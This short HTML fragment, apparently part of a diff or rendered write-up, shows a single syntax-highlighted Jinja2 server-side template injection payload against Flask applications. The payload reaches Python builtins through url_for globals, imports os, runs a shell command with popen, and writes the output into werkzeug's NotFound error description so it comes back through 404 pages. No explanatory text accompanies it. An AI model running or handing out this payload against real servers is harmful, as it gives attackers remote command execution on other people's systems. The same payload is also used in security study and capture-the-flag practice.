+<div class="highlight"><pre><span></span><span class="p">{{</span>url_for.__globals__.__builtins__<span class="p">[</span><span class="s">'setattr'</span><span class="p">](</span>lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.exceptions.NotFound<span class="p">,</span><span class="s">'description'</span><span class="p">,</span>url_for.__globals__.__builtins__<span class="p">[</span><span class="s">'__import__'</span><span class="p">](</span><span class="s">'os'</span><span class="p">)</span><span class="m">.</span>popen<span class="p">(</span><span class="s">'dir'</span><span class="p">)</span><span class="m">.</span>read<span class="p">())}}</span>
+</pre></div>
+</div>
+</div>
